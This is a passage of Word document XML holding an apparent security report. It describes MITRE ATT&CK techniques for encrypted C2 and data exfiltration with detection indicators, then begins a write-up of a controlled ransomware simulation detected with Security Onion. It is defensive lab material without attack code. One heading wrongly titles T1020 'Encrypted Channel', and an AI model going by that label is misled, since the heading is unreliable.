          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BC548BB" w14:textId="77777777" w:rsidR="006518E5" w:rsidRDefault="00C122FD" w:rsidP="006518E5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C122FD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Enterprice</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C122FD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006518E5" w:rsidRPr="006518E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>T1573 – Encrypted Channel</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34FF4C34" w14:textId="47DAF335" w:rsidR="00C122FD" w:rsidRDefault="00C122FD" w:rsidP="006518E5">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C122FD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Description: </w:t>
      </w:r>
      <w:r w:rsidR="006518E5" w:rsidRPr="006518E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>This technique involves adversaries using encryption algorithms to conceal command-and-control (C2) communications, rather than relying solely on the native security features of the underlying protocol. By encrypting the content of C2 traffic, attackers make it more difficult for defenders to inspect, analyze, or detect malicious communications.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D8D615" w14:textId="7FFF585A" w:rsidR="00C122FD" w:rsidRDefault="00236ACA" w:rsidP="00236ACA">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Why it’s used: </w:t>
      </w:r>
      <w:r w:rsidR="006518E5" w:rsidRPr="006518E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Encrypted channels help adversaries evade network-based detection and hinder traffic inspection, signature-based monitoring, and content analysis. Even when standard protocols are used, additional encryption provides a layer of protection for command data and exfiltrated information. However, such implementations may still be vulnerable to reverse engineering, especially if encryption keys are hardcoded or generated within the malware itself.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673B9DAF" w14:textId="709133BC" w:rsidR="00236ACA" w:rsidRDefault="00236ACA" w:rsidP="00236ACA">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>IOC:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A45AB79" w14:textId="7D283D67" w:rsidR="006518E5" w:rsidRPr="006518E5" w:rsidRDefault="006518E5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006518E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Outbound connections carrying encrypted payloads over otherwise simple or uncommon protocols</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DD02582" w14:textId="346DE08C" w:rsidR="006518E5" w:rsidRPr="006518E5" w:rsidRDefault="006518E5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006518E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Consistent traffic patterns with unreadable or high-entropy data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="653BE349" w14:textId="6D15FB6F" w:rsidR="006518E5" w:rsidRPr="006518E5" w:rsidRDefault="006518E5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006518E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Malware samples containing embedded encryption keys or custom cryptographic routines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61DF169A" w14:textId="0C160BE9" w:rsidR="00204E24" w:rsidRDefault="006518E5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006518E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Encrypted C2 traffic that does not align with normal application behavior</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF6414C" w14:textId="223625A1" w:rsidR="00A722B0" w:rsidRPr="00A722B0" w:rsidRDefault="00A722B0" w:rsidP="00A722B0">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="124E4FAF" wp14:editId="06324B1F">
            <wp:extent cx="5486400" cy="8267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826770"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="684640A8" w14:textId="044C0582" w:rsidR="005F602B" w:rsidRPr="005F602B" w:rsidRDefault="005F602B" w:rsidP="005F602B">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-KZ"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F602B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-KZ"/>
        </w:rPr>
        <w:t>Exfiltration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F602B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="784CE74D" w14:textId="63C65856" w:rsidR="006518E5" w:rsidRDefault="006518E5" w:rsidP="006518E5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C122FD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>Enterprice</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C122FD">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006518E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>1020</w:t>
      </w:r>
      <w:r w:rsidRPr="006518E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Encrypted Channel</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E89CDEF" w14:textId="57636F61" w:rsidR="006518E5" w:rsidRDefault="006518E5" w:rsidP="003A6019">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006518E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Description: This technique involves adversaries automatically exfiltrating collected data, such as sensitive documents or metadata, without requiring direct manual interaction. Once data is gathered during the </w:t>
      </w:r>
      <w:r w:rsidRPr="006518E5">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>collection phase, automated processes handle packaging and preparation for transfer outside the victim environment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760C12F3" w14:textId="5F6B1BC4" w:rsidR="006518E5" w:rsidRDefault="006518E5" w:rsidP="003A6019">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Why it’s used: </w:t>
      </w:r>
      <w:r w:rsidR="003A6019" w:rsidRPr="003A6019">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Automated exfiltration allows adversaries to efficiently and consistently move data out of a compromised network while reducing the need for interactive control. This increases speed, scalability, and stealth, especially in large environments. The actual data transfer typically leverages other exfiltration techniques, such as exfiltration over command-and-control channels or alternative network protocols, to bypass security controls and minimize detection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429B9BC7" w14:textId="1CBE5FF2" w:rsidR="003A6019" w:rsidRDefault="003A6019" w:rsidP="006518E5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">IOC: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="112B2825" w14:textId="0D1B1F1F" w:rsidR="003A6019" w:rsidRP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Automated or scheduled data transfer activity without user interaction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FAFC21F" w14:textId="4EED1C0D" w:rsidR="003A6019" w:rsidRP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Repeated outbound network connections following data collection events</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B6FF52" w14:textId="4B51F328" w:rsidR="003A6019" w:rsidRP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Large or unusual volumes of outbound data traffic</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E004EF6" w14:textId="52BCF928" w:rsidR="003A6019" w:rsidRPr="006518E5" w:rsidRDefault="00A722B0" w:rsidP="006518E5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="36AF45CE" wp14:editId="737EB9FC">
            <wp:extent cx="5486400" cy="9080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908050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A7254B" w14:textId="27102F2E" w:rsidR="005F602B" w:rsidRDefault="003A6019" w:rsidP="006518E5">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A6019">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>T1041 – Exfiltration Over C2 Channel</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69ED426F" w14:textId="2CB74A3F" w:rsidR="003A6019" w:rsidRDefault="003A6019" w:rsidP="003A6019">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Description: </w:t>
      </w:r>
      <w:r w:rsidRPr="003A6019">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>This technique involves adversaries stealing data by exfiltrating it over an existing command-and-control (C2) channel. The stolen data is embedded and encoded within normal C2 communications, using the same protocols and communication patterns already established for command execution and control.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3754DE12" w14:textId="5ABE88F3" w:rsidR="003A6019" w:rsidRDefault="003A6019" w:rsidP="003A6019">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Why it’s used: </w:t>
      </w:r>
      <w:r w:rsidRPr="003A6019">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Exfiltrating data over an existing C2 channel helps adversaries blend data theft with legitimate-looking command-and-control traffic, reducing the likelihood of detection. By reusing established communication paths, attackers avoid creating additional network connections that could raise suspicion and simplify the exfiltration process while maintaining stealth.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F69F934" w14:textId="598FA396" w:rsidR="003A6019" w:rsidRDefault="003A6019" w:rsidP="003A6019">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>IOC:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E63012" w14:textId="7D19383C" w:rsidR="003A6019" w:rsidRP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Increased data volume over known or suspected C2 connections</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13CF09F2" w14:textId="2C2114DE" w:rsidR="003A6019" w:rsidRP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C2 traffic containing unusually large or encoded payloads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08BD4682" w14:textId="2A09FD33" w:rsidR="003A6019" w:rsidRP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Exfiltration activity aligned with command-and-control communication intervals</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6046A88A" w14:textId="70B9E138" w:rsidR="003A6019" w:rsidRDefault="003A6019">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A6019">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>High-entropy or encoded data embedded in otherwise routine C2 messages</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F9F6FF" w14:textId="1CD15136" w:rsidR="00A722B0" w:rsidRPr="00A722B0" w:rsidRDefault="00A722B0" w:rsidP="00A722B0">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="25253A58" wp14:editId="0321FF5E">
            <wp:extent cx="5486400" cy="8070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807085"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="50351FB1" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRDefault="00C324AC" w:rsidP="00C324AC">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:lang w:val="ru-RU" w:eastAsia="ru-KZ"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C324AC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>RANSOMWARE ATTACK SIMULATION AND DETECTION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09F65D77" w14:textId="2FD3EB17"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BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r w:rsidRPr="00A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>EXECUTIVE SUMMAR</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6C5B99"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This report documents a controlled ransomware attack simulation conducted to test the detection capabilities of Security Onion SIEM platform. The attack successfully demonstrated a multi-stage ransomware operation including reconnaissance, command-and-control (C2) communication attempts, file encryption, and data exfiltration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1702CD5C"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Key Findings:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="618CEE8E" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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All 21 attack events were successfully logged and detected</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76A896E6" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Complete attack chain reconstructed from 10-second attack window</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB1E32D" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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6 files encrypted with ransomware payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F65054D" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Multiple C2 communication attempts logged</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3189072E" w14:textId="77777777" w:rsidR="00C324AC" w:rsidRPr="00BD172D" w:rsidRDefault="00C324AC">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Data exfiltration attempt blocked and recorded</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70E54FFE"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Detection Success Rate:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BD172D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve"> 100% (21/21 events logged)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283AACC6"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A1AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="09912957" wp14:editId="20EBB4AA">
            <wp:extent cx="5940425" cy="45237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523740"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E02F82D"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A1AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t>Figure 1.1: Complete ransomware attack dashboard showing 21 detected events</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F7C4CC"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76456FB1" w14:textId="7792B349"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A722B0">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ru-KZ"/>
        </w:rPr>
        <w:t xml:space="preserve">2. ENVIRONMENT SETUP </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60DAD23C"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2.1 Network Architecture</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C03F2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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B43C8EE"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KALI       </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00BD172D">
